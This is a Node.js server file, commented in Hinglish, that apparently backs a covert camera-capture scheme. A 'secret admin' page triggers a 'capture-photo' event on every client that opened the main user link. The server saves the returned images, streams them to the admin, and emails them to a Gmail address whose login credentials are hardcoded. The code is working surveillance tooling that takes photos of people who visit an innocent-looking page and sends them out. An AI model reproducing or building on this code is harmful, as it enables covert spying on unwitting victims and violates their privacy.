const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Email Setup (Apna Gmail aur App Password yaha dalein)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'prectice@gmail.com', // 👈 Apni Gmail ID
        pass: 'includestdiosystem' // 👈 16-digit App Password
    }
});

// Storage folder setup
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(uploadDir));

// 1. MAIN LINK: Main link kholne par sirf USER page khulega
app.get('/', (req, res) => {
    const userPath = fs.existsSync(path.join(__dirname, 'public', 'user.html'))
        ? path.join(__dirname, 'public', 'user.html')
        : path.join(__dirname, 'user.html');
    res.sendFile(userPath);
});

// 2. USER LINK: Direct User Page
app.get('/user.html', (req, res) => {
    const userPath = fs.existsSync(path.join(__dirname, 'public', 'user.html'))
        ? path.join(__dirname, 'public', 'user.html')
        : path.join(__dirname, 'user.html');
    res.sendFile(userPath);
});

// 3. ADMIN LINK: Direct Secret Admin Page (Aapke liye)
app.get('/admin.html', (req, res) => {
    const adminPath = fs.existsSync(path.join(__dirname, 'public', 'admin.html'))
        ? path.join(__dirname, 'public', 'admin.html')
        : path.join(__dirname, 'admin.html');
    res.sendFile(adminPath);
});

io.on('connection', (socket) => {
    console.log('⚡ Connected Device ID:', socket.id);

    socket.on('admin-trigger-capture', () => {
        io.emit('capture-photo');
    });

    socket.on('user-photo-captured', (imageData) => {
        const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
        const fileName = `photo_${Date.now()}.png`;
        const filePath = path.join(uploadDir, fileName);

        // Photo Save locally
        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
        });

        // Broadcast to Admin Live UI
        io.emit('send-photo-to-admin', imageData);

        // Gmail par photo bhejne ka setup
        const mailOptions = {
            from: 'prectice@gmail.com', // 👈 Apni Gmail
            to: 'prectice@gmail.com',   // 👈 Jis Email par photo chahiye
            subject: '📸 New Photo Captured!',
            text: 'Nayi photo capture ho gayi hai.',
            attachments: [
                {
                    filename: fileName,
                    content: base64Data,
                    encoding: 'base64'
                }
            ]
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.log('❌ Email Send Error:', error);
            } else {
                console.log('📧 Email Sent Successfully:', info.response);
            }
        });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SERVER RUNNING on port ${PORT}!`);
});